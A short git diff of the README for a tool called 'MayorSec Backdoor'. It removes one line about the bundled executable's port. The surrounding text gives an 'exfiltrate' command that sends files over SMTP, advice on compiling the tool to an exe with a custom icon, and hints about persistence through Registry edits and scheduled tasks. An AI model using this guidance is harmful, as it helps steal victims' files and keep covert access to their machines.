@@ -24,7 +24,7 @@ MayorSec Backdoor has built in exfiltration functionality via SMTP.  Use the bel
 ```exfiltrate filename <sender_email> <sender_email_password> <receiver_email>```
 
 ## Compilation
-This tool can be ran on systems that have Python3 installed, or can be compiled to exe using Pyinstaller.  I recommend using the GUI version of Pyinstaller called "Auto Py to EXE" which allows for the easy addition of an exe icon for the application.  The included .exe is set to utilize port 8180.
+This tool can be ran on systems that have Python3 installed, or can be compiled to exe using Pyinstaller.  I recommend using the GUI version of Pyinstaller called "Auto Py to EXE" which allows for the easy addition of an exe icon for the application.  
 
 ## Notes
 Windows will likely require a firewall rule in order to utilize this tool on machines with firewall enabled.  You can achieve persistence through typical manual Registry edits, scheduled tasks, etc. 
